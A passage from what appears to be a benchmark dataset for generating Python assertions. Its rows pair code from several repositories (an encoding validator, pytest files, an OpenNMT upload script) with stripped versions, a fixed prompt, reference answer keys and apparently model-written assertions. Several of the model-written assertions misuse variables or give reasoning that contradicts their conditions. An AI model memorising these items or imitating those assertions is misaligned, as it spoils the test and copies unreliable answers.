 [48, 'text', '!=', None, 'Ensure text is found'],
 [82, 'text', '!=', None, 'Ensure text is found']]"
liyandi/webValidator,"# -*- coding: utf-8 -*-
#!/usr/bin/python                        
##################################################
# AUTHOR : Yandi LI
# CREATED_AT : 2015-12-06
# LAST_MODIFIED : 2015-12-06 21:51:23
# USAGE : python core.py column
# PURPOSE : TODO
##################################################
import math
import unicodedata
import pkgutil

class Hans(object):
  """""" Check if a chinese sentence is correctly encoded. 
  ===============================================
  * Training
    - In the 'training' phase, we extract title and summary part from news over the 
      last five months. 
    - We count the document frequencies and filter those characters with 
      less than 1000 document occurrences, besides some quick fixes. 
    - After all, our dictionary consists of around 5000 unique chinese characters.
  ===============================================
  * Predict
    - For a given text sentence, assume that characters appears independently given the sentence.
      So we can easily compute the likelihood based on historical frequenciies .
    - For unknown characters, we treat them as if they appear once in the history. 
    - Romain characters, symbols, numbers are neglected.
    - For empty strings, we assume they are valid.
  """"""

  @staticmethod
  def _config():
    file_path = 'conf/common_chars.conf'
    charcnt = {}
    try:
      data = pkgutil.get_data(""webValidator"", file_path)
      for line in data.decode('utf-8').splitlines():
        try:
          char, cnt = line.split(' ')
          charcnt[char] = int(cnt)
        except:
          raise 
    except IOError:
      raise ValueError(
            ""Stoplist %s for Chinese is missing. ""
            ""and feel free to contribute by your own stoplist."" % 'common_chars.conf'
            )

    # compute log-probabilities of each character
    _TOTAL_CHAR_PROB = math.log10(sum(charcnt.itervalues()))
    _CHARDF = dict((char, math.log10(cnt) - _TOTAL_CHAR_PROB) for char,cnt in charcnt.iteritems())
    _MIN_CHAR_PROB = math.log10(min(charcnt.itervalues())) - _TOTAL_CHAR_PROB # minimum log-prob
    _MAX_CHAR_PROB = math.log10(max(charcnt.itervalues())) - _TOTAL_CHAR_PROB # maximum log-prob
    return _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB

  _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB = _config.__get__(None, object)()# _config.__func__()  #in python2.7     


  @classmethod
  def _likelihood(cls, sentence, smooth=1):
    """""" Compute the log-likelihood of a sentence assuming that characters are independent
    @Parameters
    ------------------------
    | smooth: default count for a unknown character, take value > 0
    @Returns
    ------------------------
    | log-likelihood of the sentence 
    >>> _likelihood(u""沈阳：大二大三忙创业 毕业转身去择业"") # good
    -3.022006128864273
    >>> _likelihood(u""銝箸隞砌飽銝敺憭"") # bad
    -7.507283853858208
    >>> _likelihood(u""甇瘨衣"")  # bad
    -7.375815184206794
    >>> _likelihood(u""【公　告】"") # good
    -2.692653943384265
    >>> _likelihood(u""梢▼撠"")  # bad
    -5.815355635777318
    >>> _likelihood(u"""") # empty string, use maximal count as prior
    -1.5816035211996278
    >>> _likelihood(u""Revelation"") # empty string, use maximal count as prior
    -1.5816035211996278
    """"""
    assert smooth > 0
    log_smooth = math.log10(smooth) - cls._TOTAL_CHAR_PROB
    log_like = 0.0
    alphabets = [c for c in cls._alphabetic(sentence)]
    for c in alphabets:
      log_like += cls._CHARDF.get(c, log_smooth)
    log_like = log_like / len(alphabets) if alphabets else cls._MAX_CHAR_PROB
    return log_like

  
  @staticmethod
  def _alphabetic(sentence):
    """""" generate alphabetic characters in the sentence
    >>> for i in _alphabetic(u""我们是？abcДφŌ§<《偬兟◢""): print i,
    我 们 是 偬 兟
    """"""
    ALPHABETIC = ['Lm', 'Lo'] # 'Lu', 'Lo', 'Lt' -> romain letters, 'Nl'-> number letter, etc.
    for c in sentence:
      if unicodedata.category(c) in ALPHABETIC:
        yield c


  @classmethod
  def validate(cls, sentence, return_prob=False, MIN_LOG_LIKE=-5):
    """""" Main, check if a text string has been rightly encoded. 
    Romain characters, symbols, numbers are neglected.
    @Parameters
    ----------------------
    | sentence: a unicode string
    | MIN_LOG_LIKE: threshold of the log-likelihood. Sentences with higher likelihood will validate. 
    |               The default value -5 is a good one, as the minimal likelihood of a 
    |               single valid char is around -6, itself being more or less on the boundary
    | return_prob: whether to return the value of log-likelihood
    @Returns
    ----------------------
    | True/False, log-likehood
    >>> core.Hans.validate(u""我们是？abcДφŌ§<《偬兟◢"", return_prob=True)
    (False, -5.2000414461180196)
    >>> core.Hans.validate(u""我们是？bcДφŌ§<《◢"", return_prob=True)
    (True, -2.5054545978898513)
    """"""
    assert isinstance(sentence, unicode)
    prob = cls._likelihood(sentence)
    if return_prob:
      return prob > MIN_LOG_LIKE, prob
    else:
      return prob > MIN_LOG_LIKE
    


if __name__ == ""__main__"":
  
  import sys

  fname = sys.argv[1]
  f = open(fname)
  fout = open(fname + '_out', 'w')

  for line in f:
    line = line.rstrip('\r\n')
    r, p = Hans.validate(line.decode('utf-8'), return_prob=True)
    fout.write(line + '\t' + str(r) + '\t' + str(p) + '\n')





","
1# -*- coding: utf-8 -*-
2#!/usr/bin/python                        
3##################################################
4# AUTHOR : Yandi LI
5# CREATED_AT : 2015-12-06
6# LAST_MODIFIED : 2015-12-06 21:51:23
7# USAGE : python core.py column
8# PURPOSE : TODO
9##################################################
10import math
11import unicodedata
12import pkgutil
13
14class Hans(object):
15  """""" Check if a chinese sentence is correctly encoded. 
16  ===============================================
17  * Training
18    - In the 'training' phase, we extract title and summary part from news over the 
19      last five months. 
20    - We count the document frequencies and filter those characters with 
21      less than 1000 document occurrences, besides some quick fixes. 
22    - After all, our dictionary consists of around 5000 unique chinese characters.
23  ===============================================
24  * Predict
25    - For a given text sentence, assume that characters appears independently given the sentence.
26      So we can easily compute the likelihood based on historical frequenciies .
27    - For unknown characters, we treat them as if they appear once in the history. 
28    - Romain characters, symbols, numbers are neglected.
29    - For empty strings, we assume they are valid.
30  """"""
31
32  @staticmethod
33  def _config():
34    file_path = 'conf/common_chars.conf'
35    charcnt = {}
36    try:
37      data = pkgutil.get_data(""webValidator"", file_path)
38      for line in data.decode('utf-8').splitlines():
39        try:
40          char, cnt = line.split(' ')
41          charcnt[char] = int(cnt)
42        except:
43          raise 
44    except IOError:
45      raise ValueError(
46            ""Stoplist %s for Chinese is missing. ""
47            ""and feel free to contribute by your own stoplist."" % 'common_chars.conf'
48            )
49
50    # compute log-probabilities of each character
51    _TOTAL_CHAR_PROB = math.log10(sum(charcnt.itervalues()))
52    _CHARDF = dict((char, math.log10(cnt) - _TOTAL_CHAR_PROB) for char,cnt in charcnt.iteritems())
53    _MIN_CHAR_PROB = math.log10(min(charcnt.itervalues())) - _TOTAL_CHAR_PROB # minimum log-prob
54    _MAX_CHAR_PROB = math.log10(max(charcnt.itervalues())) - _TOTAL_CHAR_PROB # maximum log-prob
55    return _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB
56
57  _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB = _config.__get__(None, object)()# _config.__func__()  #in python2.7     
58
59
60  @classmethod
61  def _likelihood(cls, sentence, smooth=1):
62    """""" Compute the log-likelihood of a sentence assuming that characters are independent
63    @Parameters
64    ------------------------
65    | smooth: default count for a unknown character, take value > 0
66    @Returns
67    ------------------------
68    | log-likelihood of the sentence 
69    >>> _likelihood(u""沈阳：大二大三忙创业 毕业转身去择业"") # good
70    -3.022006128864273
71    >>> _likelihood(u""銝箸隞砌飽銝敺憭"") # bad
72    -7.507283853858208
73    >>> _likelihood(u""甇瘨衣"")  # bad
74    -7.375815184206794
75    >>> _likelihood(u""【公　告】"") # good
76    -2.692653943384265
77    >>> _likelihood(u""梢▼撠"")  # bad
78    -5.815355635777318
79    >>> _likelihood(u"""") # empty string, use maximal count as prior
80    -1.5816035211996278
81    >>> _likelihood(u""Revelation"") # empty string, use maximal count as prior
82    -1.5816035211996278
83    """"""
84    log_smooth = math.log10(smooth) - cls._TOTAL_CHAR_PROB
85    log_like = 0.0
86    alphabets = [c for c in cls._alphabetic(sentence)]
87    for c in alphabets:
88      log_like += cls._CHARDF.get(c, log_smooth)
89    log_like = log_like / len(alphabets) if alphabets else cls._MAX_CHAR_PROB
90    return log_like
91
92  
93  @staticmethod
94  def _alphabetic(sentence):
95    """""" generate alphabetic characters in the sentence
96    >>> for i in _alphabetic(u""我们是？abcДφŌ§<《偬兟◢""): print i,
97    我 们 是 偬 兟
98    """"""
99    ALPHABETIC = ['Lm', 'Lo'] # 'Lu', 'Lo', 'Lt' -> romain letters, 'Nl'-> number letter, etc.
100    for c in sentence:
101      if unicodedata.category(c) in ALPHABETIC:
102        yield c
103
104
105  @classmethod
106  def validate(cls, sentence, return_prob=False, MIN_LOG_LIKE=-5):
107    """""" Main, check if a text string has been rightly encoded. 
108    Romain characters, symbols, numbers are neglected.
109    @Parameters
110    ----------------------
111    | sentence: a unicode string
112    | MIN_LOG_LIKE: threshold of the log-likelihood. Sentences with higher likelihood will validate. 
113    |               The default value -5 is a good one, as the minimal likelihood of a 
114    |               single valid char is around -6, itself being more or less on the boundary
115    | return_prob: whether to return the value of log-likelihood
116    @Returns
117    ----------------------
118    | True/False, log-likehood
119    >>> core.Hans.validate(u""我们是？abcДφŌ§<《偬兟◢"", return_prob=True)
120    (False, -5.2000414461180196)
121    >>> core.Hans.validate(u""我们是？bcДφŌ§<《◢"", return_prob=True)
122    (True, -2.5054545978898513)
123    """"""
124    prob = cls._likelihood(sentence)
125    if return_prob:
126      return prob > MIN_LOG_LIKE, prob
127    else:
128      return prob > MIN_LOG_LIKE
129    
130
131
132if __name__ == ""__main__"":
133  
134  import sys
135
136  fname = sys.argv[1]
137  f = open(fname)
138  fout = open(fname + '_out', 'w')
139
140  for line in f:
141    line = line.rstrip('\r\n')
142    r, p = Hans.validate(line.decode('utf-8'), return_prob=True)
143    fout.write(line + '\t' + str(r) + '\t' + str(p) + '\n')
144
145
146
147
148
149","[['smooth', '>', '0']]",2,1,0.5,0.0001874414245548,"['file_path', 'charcnt', 'data', 'char', 'cnt', 'charcnt[char]', '_TOTAL_CHAR_PROB', '_CHARDF', '_MIN_CHAR_PROB', '_MAX_CHAR_PROB', 'cls', 'sentence', 'smooth', 'log_smooth', 'log_like', 'alphabets', 'ALPHABETIC', 'return_prob', 'MIN_LOG_LIKE', 'prob', 'fname', 'f', 'fout', 'line', 'r', 'p']",26,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['file_path', 'charcnt', 'data', 'char', 'cnt', 'charcnt[char]', '_TOTAL_CHAR_PROB', '_CHARDF', '_MIN_CHAR_PROB', '_MAX_CHAR_PROB', 'cls', 'sentence', 'smooth', 'log_smooth', 'log_like', 'alphabets', 'ALPHABETIC', 'return_prob', 'MIN_LOG_LIKE', 'prob', 'fname', 'f', 'fout', 'line', 'r', 'p']
*Code:

1# -*- coding: utf-8 -*-
2#!/usr/bin/python                        
3##################################################
4# AUTHOR : Yandi LI
5# CREATED_AT : 2015-12-06
6# LAST_MODIFIED : 2015-12-06 21:51:23
7# USAGE : python core.py column
8# PURPOSE : TODO
9##################################################
10import math
11import unicodedata
12import pkgutil
13
14class Hans(object):
15  """""" Check if a chinese sentence is correctly encoded. 
16  ===============================================
17  * Training
18    - In the 'training' phase, we extract title and summary part from news over the 
19      last five months. 
20    - We count the document frequencies and filter those characters with 
21      less than 1000 document occurrences, besides some quick fixes. 
22    - After all, our dictionary consists of around 5000 unique chinese characters.
23  ===============================================
24  * Predict
25    - For a given text sentence, assume that characters appears independently given the sentence.
26      So we can easily compute the likelihood based on historical frequenciies .
27    - For unknown characters, we treat them as if they appear once in the history. 
28    - Romain characters, symbols, numbers are neglected.
29    - For empty strings, we assume they are valid.
30  """"""
31
32  @staticmethod
33  def _config():
34    file_path = 'conf/common_chars.conf'
35    charcnt = {}
36    try:
37      data = pkgutil.get_data(""webValidator"", file_path)
38      for line in data.decode('utf-8').splitlines():
39        try:
40          char, cnt = line.split(' ')
41          charcnt[char] = int(cnt)
42        except:
43          raise 
44    except IOError:
45      raise ValueError(
46            ""Stoplist %s for Chinese is missing. ""
47            ""and feel free to contribute by your own stoplist."" % 'common_chars.conf'
48            )
49
50    # compute log-probabilities of each character
51    _TOTAL_CHAR_PROB = math.log10(sum(charcnt.itervalues()))
52    _CHARDF = dict((char, math.log10(cnt) - _TOTAL_CHAR_PROB) for char,cnt in charcnt.iteritems())
53    _MIN_CHAR_PROB = math.log10(min(charcnt.itervalues())) - _TOTAL_CHAR_PROB # minimum log-prob
54    _MAX_CHAR_PROB = math.log10(max(charcnt.itervalues())) - _TOTAL_CHAR_PROB # maximum log-prob
55    return _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB
56
57  _CHARDF, _MIN_CHAR_PROB, _MAX_CHAR_PROB, _TOTAL_CHAR_PROB = _config.__get__(None, object)()# _config.__func__()  #in python2.7     
58
59
60  @classmethod
61  def _likelihood(cls, sentence, smooth=1):
62    """""" Compute the log-likelihood of a sentence assuming that characters are independent
63    @Parameters
64    ------------------------
65    | smooth: default count for a unknown character, take value > 0
66    @Returns
67    ------------------------
68    | log-likelihood of the sentence 
69    >>> _likelihood(u""沈阳：大二大三忙创业 毕业转身去择业"") # good
70    -3.022006128864273
71    >>> _likelihood(u""銝箸隞砌飽銝敺憭"") # bad
72    -7.507283853858208
73    >>> _likelihood(u""甇瘨衣"")  # bad
74    -7.375815184206794
75    >>> _likelihood(u""【公　告】"") # good
76    -2.692653943384265
77    >>> _likelihood(u""梢▼撠"")  # bad
78    -5.815355635777318
79    >>> _likelihood(u"""") # empty string, use maximal count as prior
80    -1.5816035211996278
81    >>> _likelihood(u""Revelation"") # empty string, use maximal count as prior
82    -1.5816035211996278
83    """"""
84    log_smooth = math.log10(smooth) - cls._TOTAL_CHAR_PROB
85    log_like = 0.0
86    alphabets = [c for c in cls._alphabetic(sentence)]
87    for c in alphabets:
88      log_like += cls._CHARDF.get(c, log_smooth)
89    log_like = log_like / len(alphabets) if alphabets else cls._MAX_CHAR_PROB
90    return log_like
91
92  
93  @staticmethod
94  def _alphabetic(sentence):
95    """""" generate alphabetic characters in the sentence
96    >>> for i in _alphabetic(u""我们是？abcДφŌ§<《偬兟◢""): print i,
97    我 们 是 偬 兟
98    """"""
99    ALPHABETIC = ['Lm', 'Lo'] # 'Lu', 'Lo', 'Lt' -> romain letters, 'Nl'-> number letter, etc.
100    for c in sentence:
101      if unicodedata.category(c) in ALPHABETIC:
102        yield c
103
104
105  @classmethod
106  def validate(cls, sentence, return_prob=False, MIN_LOG_LIKE=-5):
107    """""" Main, check if a text string has been rightly encoded. 
108    Romain characters, symbols, numbers are neglected.
109    @Parameters
110    ----------------------
111    | sentence: a unicode string
112    | MIN_LOG_LIKE: threshold of the log-likelihood. Sentences with higher likelihood will validate. 
113    |               The default value -5 is a good one, as the minimal likelihood of a 
114    |               single valid char is around -6, itself being more or less on the boundary
115    | return_prob: whether to return the value of log-likelihood
116    @Returns
117    ----------------------
118    | True/False, log-likehood
119    >>> core.Hans.validate(u""我们是？abcДφŌ§<《偬兟◢"", return_prob=True)
120    (False, -5.2000414461180196)
121    >>> core.Hans.validate(u""我们是？bcДφŌ§<《◢"", return_prob=True)
122    (True, -2.5054545978898513)
123    """"""
124    prob = cls._likelihood(sentence)
125    if return_prob:
126      return prob > MIN_LOG_LIKE, prob
127    else:
128      return prob > MIN_LOG_LIKE
129    
130
131
132if __name__ == ""__main__"":
133  
134  import sys
135
136  fname = sys.argv[1]
137  f = open(fname)
138  fout = open(fname + '_out', 'w')
139
140  for line in f:
141    line = line.rstrip('\r\n')
142    r, p = Hans.validate(line.decode('utf-8'), return_prob=True)
143    fout.write(line + '\t' + str(r) + '\t' + str(p) + '\n')
144
145
146
147
148
149",7284,"[[34, 'file_path', '!=', '', ""Configuration file path must not be empty""],
 [37, 'data', '!=', None, ""Data from file_path must not be None""],
 [64, 'smooth', '>=', 1, ""Smooth parameter must be >= 1 for likelihood computations""],
 [86, 'log_like', '==', 0.0,  ""Initial log likelihood must be 0""],
 [90, 'alphabets', '!=', None, ""Alphabets from the sentence must not be None""],
 [106, 'sentence', '!=', '', ""Sentence to validate must not be empty""],
 [106, 'MIN_LOG_LIKE', '>=', -5, ""Minimal Log Like value cannot be greater than -5""],
 [124, 'prob', '!=', None, ""Probabilty value cannot be None""],
 [142, 'r', '!=', None, ""Validation result cannot be None""],
 [142, 'p', '!=', None, ""Validation probability cannot be None""]]"
spookey/ffflash,"from json import dumps


def test_ffflash_load_api_this_is_no_json(tmpdir, fffake):
    apifile = tmpdir.join('phony_api_file.txt')
    apifile.write_text('this is no json', 'utf-8')
    assert tmpdir.listdir() == [apifile]

    f = fffake(apifile, dry=True)
    assert f

    assert f.args.APIfile == str(apifile)
    assert f.location == str(apifile)
    assert f.api is None

    assert tmpdir.remove() is None


def test_ffflash_load_api(tmpdir, fffake):
    apifile = tmpdir.join('phony_api_file.json')
    c = {'a': 'b'}
    apifile.write_text(dumps(c), 'utf-8')
    assert tmpdir.listdir() == [apifile]

    f = fffake(apifile, dry=True)
    assert f

    assert f.api is not None
    assert f.api.c == c
    assert f.api.pull('a') == 'b'

    assert tmpdir.remove() is None


def test_ffflash_reload_api(tmpdir, fffake):
    apifile = tmpdir.join('phony_api_file.json')
    c = {'a': 'b'}
    apifile.write_text(dumps(c), 'utf-8')
    assert tmpdir.listdir() == [apifile]

    f = fffake(apifile, dry=True)
    assert f

    assert f.api is not None
    assert f.api.c == c
    assert f.api.pull('a') == 'b'

    assert f.api.push('c', 'a') is None
    assert f.api.pull('a') == 'c'
    assert f.load_api() is None
    assert f.api.pull('a') != 'b'
    assert f.api.pull('a') == 'c'

    assert tmpdir.remove() is None
","
1from json import dumps
2
3
4def test_ffflash_load_api_this_is_no_json(tmpdir, fffake):
5    apifile = tmpdir.join('phony_api_file.txt')
6    apifile.write_text('this is no json', 'utf-8')
7
8    f = fffake(apifile, dry=True)
9
10
11
12
13def test_ffflash_load_api(tmpdir, fffake):
14    apifile = tmpdir.join('phony_api_file.json')
15    c = {'a': 'b'}
16    apifile.write_text(dumps(c), 'utf-8')
17
18    f = fffake(apifile, dry=True)
19
20
21
22
23def test_ffflash_reload_api(tmpdir, fffake):
24    apifile = tmpdir.join('phony_api_file.json')
25    c = {'a': 'b'}
26    apifile.write_text(dumps(c), 'utf-8')
27
28    f = fffake(apifile, dry=True)
29
30
31
32","[['tmpdir.listdir()', '==', '[apifile]'], ['f', '==', 'True'], ['f.args.APIfile', '==', 'str(apifile)'], ['f.location', '==', 'str(apifile)'], ['f.api', '==', 'None'], ['tmpdir.remove()', '==', 'None'], ['tmpdir.listdir()', '==', '[apifile]'], ['f', '==', 'True'], ['f.api', '==', 'not None'], ['f.api.c', '==', 'c'], [""f.api.pull('a')"", '==', ""'b'""], ['tmpdir.remove()', '==', 'None'], ['tmpdir.listdir()', '==', '[apifile]'], ['f', '==', 'True'], ['f.api', '==', 'not None'], ['f.api.c', '==', 'c'], [""f.api.pull('a')"", '==', ""'b'""], [""f.api.push('c'"", '==', 'True'], [""f.api.pull('a')"", '==', ""'c'""], ['f.load_api()', '==', 'None'], [""f.api.pull('a')"", '!=', ""'b'""], [""f.api.pull('a')"", '==', ""'c'""], ['tmpdir.remove()', '==', 'None']]",23,23,1.0,0.0173323285606631,"['tmpdir', 'fffake', 'apifile', 'f', 'c']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['tmpdir', 'fffake', 'apifile', 'f', 'c']
*Code:

1from json import dumps
2
3
4def test_ffflash_load_api_this_is_no_json(tmpdir, fffake):
5    apifile = tmpdir.join('phony_api_file.txt')
6    apifile.write_text('this is no json', 'utf-8')
7
8    f = fffake(apifile, dry=True)
9
10
11
12
13def test_ffflash_load_api(tmpdir, fffake):
14    apifile = tmpdir.join('phony_api_file.json')
15    c = {'a': 'b'}
16    apifile.write_text(dumps(c), 'utf-8')
17
18    f = fffake(apifile, dry=True)
19
20
21
22
23def test_ffflash_reload_api(tmpdir, fffake):
24    apifile = tmpdir.join('phony_api_file.json')
25    c = {'a': 'b'}
26    apifile.write_text(dumps(c), 'utf-8')
27
28    f = fffake(apifile, dry=True)
29
30
31
32",2084,"[[4, 'tmpdir', '!=', None, ""tmpdir must be defined to enable access to temporary directory""],
 [4, 'fffake', '!=', None, ""fffake function must be defined""],
 [13, 'tmpdir', '!=', None, ""tmpdir must be defined to enable access to temporary directory""],
 [13, 'fffake', '!=', None, ""fffake function must be defined""],
 [22, 'tmpdir', '!=', None, ""tmpdir must be defined to enable access to temporary directory""],
 [22, 'fffake', '!=', None, ""fffake function must be defined""]]"
monsieurzhang/OpenNMT,"import requests
import argparse
import sys
import time
from datetime import date
import os
import json
import subprocess
import re

url = 'http://scorer.nmt-benchmark.net'

def main(args):
    scriptpath=os.path.dirname(os.path.realpath(__file__))

    parser = argparse.ArgumentParser(description='Benchmark test download')
    parser.add_argument('--apikey', help='Your API key',required=True)
    parser.add_argument('--systemId', help='Id of the system',required=True)
    parser.add_argument('--info', help='info file',required=True)
    parser.add_argument('--output', help='output file',required=True)

    args = parser.parse_args(args)

    assert len(args.apikey)==20, ""invalid api key""
    assert len(args.systemId)==24, ""invalid system id""

    assert os.path.exists(args.info), ""info file does not exist""

    infojson = None
    with open(args.info) as infofile:
        infojson = json.load(infofile)

    testId = infojson[""_id""]

    sourcefile=re.sub(r"".info"","".org"",args.info)

    output = None
    print ""* read output file""
    with open(args.output) as f:
        output=f.read()

    if re.search(r""\.(sgm|sgml|xml)$"",infojson['source']['fileName']):
        p = subprocess.Popen([""perl"",scriptpath+""/3rdParty/wrap-xml.perl"",
                                infojson['target']['language'],
                                sourcefile, ""NMT""],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
        print ""* convert output to sgm file""
        p.stdin.write(output)
        output=p.communicate()[0]

    print ""* save '""+re.sub(r"".info"","".trans"",args.info)+""'""
    with open(re.sub(r"".info"","".trans"",args.info),""w"") as fOutput:
        fOutput.write(output)
        fOutput.close()

    data = {'systemId': args.systemId, 'fileId': testId}
    files = {'outputFile': open(re.sub(r"".info"","".trans"",args.info),""r"")}
    response = requests.post(url + '/output/upload/' + args.apikey, data=data, files=files)
    if response.status_code != requests.codes.ok:
        response.raise_for_status()
    else:
        print(response)


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
","
1import requests
2import argparse
3import sys
4import time
5from datetime import date
6import os
7import json
8import subprocess
9import re
10
11url = 'http://scorer.nmt-benchmark.net'
12
13def main(args):
14    scriptpath=os.path.dirname(os.path.realpath(__file__))
15
16    parser = argparse.ArgumentParser(description='Benchmark test download')
17    parser.add_argument('--apikey', help='Your API key',required=True)
18    parser.add_argument('--systemId', help='Id of the system',required=True)
19    parser.add_argument('--info', help='info file',required=True)
20    parser.add_argument('--output', help='output file',required=True)
21
22    args = parser.parse_args(args)
23
24
25
26    infojson = None
27    with open(args.info) as infofile:
28        infojson = json.load(infofile)
29
30    testId = infojson[""_id""]
31
32    sourcefile=re.sub(r"".info"","".org"",args.info)
33
34    output = None
35    print ""* read output file""
36    with open(args.output) as f:
37        output=f.read()
38
39    if re.search(r""\.(sgm|sgml|xml)$"",infojson['source']['fileName']):
40        p = subprocess.Popen([""perl"",scriptpath+""/3rdParty/wrap-xml.perl"",
41                                infojson['target']['language'],
42                                sourcefile, ""NMT""],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
43        print ""* convert output to sgm file""
44        p.stdin.write(output)
45        output=p.communicate()[0]
46
47    print ""* save '""+re.sub(r"".info"","".trans"",args.info)+""'""
48    with open(re.sub(r"".info"","".trans"",args.info),""w"") as fOutput:
49        fOutput.write(output)
50        fOutput.close()
51
52    data = {'systemId': args.systemId, 'fileId': testId}
53    files = {'outputFile': open(re.sub(r"".info"","".trans"",args.info),""r"")}
54    response = requests.post(url + '/output/upload/' + args.apikey, data=data, files=files)
55    if response.status_code != requests.codes.ok:
56        response.raise_for_status()
57    else:
58        print(response)
59
60
61if __name__ == '__main__':
62    sys.exit(main(sys.argv[1:]))
63","[['len(args.apikey)==20', '==', 'True'], ['len(args.systemId)==24', '==', 'True'], ['os.path.exists(args.info)', '==', 'True']]",3,3,1.0,0.0014224751066856,"['url', 'args', 'parser', 'infojson', 'testId', 'output', 'p', 'data', 'files', 'response']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['url', 'args', 'parser', 'infojson', 'testId', 'output', 'p', 'data', 'files', 'response']
*Code:

1import requests
2import argparse
3import sys
4import time
5from datetime import date
6import os
7import json
8import subprocess
9import re
10
11url = 'http://scorer.nmt-benchmark.net'
12
13def main(args):
14    scriptpath=os.path.dirname(os.path.realpath(__file__))
15
16    parser = argparse.ArgumentParser(description='Benchmark test download')
17    parser.add_argument('--apikey', help='Your API key',required=True)
18    parser.add_argument('--systemId', help='Id of the system',required=True)
19    parser.add_argument('--info', help='info file',required=True)
20    parser.add_argument('--output', help='output file',required=True)
21
22    args = parser.parse_args(args)
23
24
25
26    infojson = None
27    with open(args.info) as infofile:
28        infojson = json.load(infofile)
29
30    testId = infojson[""_id""]
31
32    sourcefile=re.sub(r"".info"","".org"",args.info)
33
34    output = None
35    print ""* read output file""
36    with open(args.output) as f:
37        output=f.read()
38
39    if re.search(r""\.(sgm|sgml|xml)$"",infojson['source']['fileName']):
40        p = subprocess.Popen([""perl"",scriptpath+""/3rdParty/wrap-xml.perl"",
41                                infojson['target']['language'],
42                                sourcefile, ""NMT""],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
43        print ""* convert output to sgm file""
44        p.stdin.write(output)
45        output=p.communicate()[0]
46
47    print ""* save '""+re.sub(r"".info"","".trans"",args.info)+""'""
48    with open(re.sub(r"".info"","".trans"",args.info),""w"") as fOutput:
49        fOutput.write(output)
50        fOutput.close()
51
52    data = {'systemId': args.systemId, 'fileId': testId}
53    files = {'outputFile': open(re.sub(r"".info"","".trans"",args.info),""r"")}
54    response = requests.post(url + '/output/upload/' + args.apikey, data=data, files=files)
55    if response.status_code != requests.codes.ok:
56        response.raise_for_status()
57    else:
58        print(response)
59
60
61if __name__ == '__main__':
62    sys.exit(main(sys.argv[1:]))
63",3527,"[[13, 'args', '!=', None, ""function main() requires args to execute properly""],
[27, 'args.info', '!=', None, ""info file needs to exist for opening""],
[36, 'args.output', '!=', None, ""output file needs to exist for opening""],
[39, 'infojson', '!=', None, ""infojson needs to be loaded to reach this line""],
[41, 'infojson.target.language', '!=', None, ""language from target in infojson is needed""],
[54, 'testId', '!=', None, ""testId is required""],
[54, 'args.systemId', '!=', None, ""systemId is required""],
[54, 'args.apikey', '!=', None, ""apikey is required""]]"
andrewyoung1991/abjad,"# -*- encoding: utf-8 -*-
from abjad import *



def test_scoretools_Container___delitem___01():
    r'''Delete spanned component.
    Component withdraws crossing spanners.
    Component carries covered spanners forward.
    Operation always leaves all expressions in tact.
    '''

    voice = Voice(""{ c'8 d'8 } { e'8 f'8 }"")
    beam = Beam()
    attach(beam, voice[:])
    slur = Slur()
    attach(slur, voice[0][:])
